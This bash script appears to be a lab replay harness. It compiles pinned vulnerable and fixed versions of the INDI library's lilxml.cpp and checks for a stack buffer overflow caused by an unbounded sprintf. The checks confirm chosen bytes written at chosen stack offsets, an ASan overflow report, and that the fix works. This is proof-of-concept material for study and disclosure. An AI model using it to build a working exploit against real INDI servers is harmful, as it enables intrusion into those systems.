#!/usr/bin/env bash
# Replay driver: bash lab/frontier/indiserver2shell/run.sh <outdir>
# Compiles the VERBATIM pinned upstream libs/indicore/lilxml.cpp at the fix
# commit's parent (3220880, affected) and the fix commit (96bbd7f, fixed)
# against one driver that calls the real parseXMLChunk() -> oneXMLchar().
# No production function is reimplemented.  Loopback only; no daemon is run.
set -u

here=$(cd "$(dirname "$0")" && pwd)
out=${1:-out}
mkdir -p "$out"
out=$(cd "$out" && pwd)

fail=0
pass() { printf 'PASS %s\n' "$1"; }
needre() { if grep -qE -- "$2" "$1"; then pass "$3"; else bad "$3"; fi; }
bad()  { printf 'FAIL %s\n' "$1"; fail=1; }
need() { if grep -qF -- "$2" "$1"; then pass "$3"; else bad "$3"; fi; }

# --- pinned source bytes (raw.githubusercontent.com, see PROVENANCE.md) ---
cat >"$out/pinned.sha256" <<'EOF'
06b9de6dc825086f2808032898760f3360779299a6ba9bbce3f7410d1cdfc794  vuln/MsgQueue.cpp
c0cbf921de2347f0dfdee8948c8c676aa61cd2d64865cb5529978214a060b653  vuln/lilxml.cpp
0889007a3ce308a05f0e8bf59f8853b081f9a518e0470607658f69902556af6e  vuln/lilxml.h
f46b998d5f3f5c9342868d573f60af1e8bcb0f4feb7c565d880b7b11b1ca0194  fixed/lilxml.cpp
0d69647343a98f7b8c12835b2c872790e972846d3a98221567510f2b2a471de9  fixed/lilxml.h
EOF
if (cd "$here/src" && sha256sum -c "$out/pinned.sha256" >"$out/pinned.check" 2>&1); then
    pass PINNED_SOURCE_BYTES
else
    bad PINNED_SOURCE_BYTES
fi

# --- verbatim source assertions (no reimplementation, exact upstream line) ---
need "$here/src/vuln/lilxml.cpp" \
  'sprintf(ynot, "Line %d: closing tag %s does not match %s", lp->ln, lp->endtag.s, lp->ce->tag.s);' \
  VULN_UNBOUNDED_SPRINTF
need "$here/src/vuln/MsgQueue.cpp" 'char err[1024];' VULN_CALLER_BUFFER
need "$here/src/fixed/lilxml.cpp" \
  'snprintf(ynot, XML_ERROR_SIZE, "Line %d: closing tag %s does not match %s", lp->ln, lp->endtag.s, lp->ce->tag.s);' \
  FIXED_BOUNDED_SNPRINTF
need "$here/src/fixed/lilxml.h" '#define XML_ERROR_SIZE 1024' FIXED_SIZE_CONTRACT
if [ "$(grep -nF 'sprintf(ynot, "Line %d: closing tag' "$here/src/vuln/lilxml.cpp" | cut -d: -f1)" = "1281" ]; then
    pass VULN_UPSTREAM_LINE_1281
else
    bad VULN_UPSTREAM_LINE_1281
fi
if [ "$(grep -nF 'char err[1024];' "$here/src/vuln/MsgQueue.cpp" | cut -d: -f1)" = "525" ]; then
    pass VULN_CALLER_LINE_525
else
    bad VULN_CALLER_LINE_525
fi

# --- compile the real pinned source in three modes ---
CXXFLAGS='-std=gnu++11 -O0 -g -Wall -fno-stack-protector'
g++ $CXXFLAGS -I"$here/src/vuln"  -o "$out/vuln"  "$here/driver.cpp" "$here/src/vuln/lilxml.cpp"  || exit 91
g++ $CXXFLAGS -I"$here/src/vuln"  -fsanitize=address -fno-omit-frame-pointer \
    -o "$out/asan" "$here/driver.cpp" "$here/src/vuln/lilxml.cpp" || exit 92
g++ $CXXFLAGS -I"$here/src/fixed" -o "$out/fixed" "$here/driver.cpp" "$here/src/fixed/lilxml.cpp" || exit 93
pass COMPILE

# --- rungs 1/2: layout + observed overflow into the adjacent stack region ---
"$out/vuln" capture 600 0 >"$out/vuln0.out" 2>&1
need "$out/vuln0.out" \
  'PACKET len=1206 taglen=600 open_off=636 chosen_at=388 victim_off=0 err_size=1024 expected_errlen=1237 expected_oob=213' \
  RUNG1_LAYOUT
need "$out/vuln0.out" 'CAPTURE nodes=nonnull first_changed=0' RUNG2_OVERFLOW_OBSERVED
need "$out/vuln0.out" \
  'VICTIM requested_offset=0 chosen_offset=0 chosen_bytes=INDI2SHELL supplied=INDI2SHELL' \
  RUNG2_CHOSEN_BYTES_AT_OFFSET0

# --- rung 4: chosen bytes at a second chosen offset ---
"$out/vuln" capture 600 64 >"$out/vuln64.out" 2>&1
need "$out/vuln64.out" \
  'VICTIM requested_offset=64 chosen_offset=64 chosen_bytes=INDI2SHELL supplied=INDI2SHELL' \
  RUNG4_CHOSEN_BYTES_AT_OFFSET64

# --- rung 3: ASan-confirmed stack corruption in the REAL upstream function ---
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$out/asan" asan 600 >"$out/asan.out" 2>&1
arc=$?
if [ "$arc" -ne 0 ]; then pass ASAN_NONZERO_RC; else bad ASAN_NONZERO_RC; fi
need "$out/asan.out" 'stack-buffer-overflow' ASAN_STACK_OVERFLOW
need "$out/asan.out" 'WRITE of size 1237' ASAN_WRITE_SIZE
needre "$out/asan.out" 'oneXMLchar.*lilxml.cpp:1281' ASAN_UPSTREAM_FRAME
needre "$out/asan.out" 'parseXMLChunk.*lilxml.cpp:348' ASAN_UPSTREAM_CALLER

# --- fixed control: 96bbd7f bounds the format to XML_ERROR_SIZE ---
"$out/fixed" capture 600 64 >"$out/fixed.out" 2>&1
need "$out/fixed.out" 'CAPTURE nodes=nonnull first_changed=-1' FIXED_NEIGHBOUR_CLEAN
need "$out/fixed.out" \
  'VICTIM requested_offset=64 chosen_offset=-1 chosen_bytes= supplied=INDI2SHELL' \
  FIXED_CHOSEN_ABSENT

# --- deterministic trace: exclude ASan PID/address/path noise ---
{
    cat "$out/pinned.check"
    cat "$out/vuln0.out"
    cat "$out/vuln64.out"
    grep -qF 'stack-buffer-overflow' "$out/asan.out" && echo 'ASAN stack-buffer-overflow'
    grep -qF 'WRITE of size 1237' "$out/asan.out" && echo 'ASAN WRITE of size 1237'
    grep -qE 'oneXMLchar.*lilxml.cpp:1281' "$out/asan.out" && echo 'ASAN frame oneXMLchar lilxml.cpp:1281'
    grep -qE 'parseXMLChunk.*lilxml.cpp:348' "$out/asan.out" && echo 'ASAN caller parseXMLChunk lilxml.cpp:348'
    grep -qF "'err' (line" "$out/asan.out" && echo 'ASAN victim err'
    cat "$out/fixed.out"
} >"$out/trace.txt"
sha256sum "$out/trace.txt" | cut -d' ' -f1 >"$out/trace.sha256"
printf 'sha256=%s\n' "$(cat "$out/trace.sha256")"

if [ "$fail" -eq 0 ]; then
    echo 'ALL CHECKS PASS rc 0'
    exit 0
fi
echo 'SOME CHECKS FAILED rc 1'
exit 1
